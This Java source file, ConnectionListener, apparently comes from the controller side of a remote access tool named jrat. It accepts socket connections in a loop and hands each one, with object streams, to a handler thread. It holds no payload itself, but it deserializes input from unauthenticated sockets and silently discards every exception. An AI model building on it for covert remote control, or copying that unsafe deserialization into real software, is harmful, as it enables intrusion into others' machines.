package net.jrat.core.threads;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import net.jrat.core.Server;
import net.jrat.core.listener.Listener;
import net.jrat.core.listener.State;

public class ConnectionListener implements Runnable
{
	private final Server server = Server.instance;
	
	public List<ActionListener> listeners;
	private Listener listener;
	
	public ConnectionListener(Listener listener)
	{
		this.listener = listener;
		this.listeners = new ArrayList<ActionListener>();
	}
	
	@Override
	public void run()
	{
		while(this.listener.state == State.STARTED && this.server.running)
		{
			try
			{
				final Socket socket = this.listener.serverSocket.accept();
				socket.setKeepAlive(true);
				
				final ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
				final ObjectInputStream inputStream = new ObjectInputStream(socket.getInputStream());
				
				final ActionListener listener = new ActionListener(this.listener, socket, inputStream, outputStream);
				this.listeners.add(listener);
				
				new Thread(listener, "connection").start();
			}
			catch(Exception e) {}
		}
		
		this.listener.thread = null;
	}
}
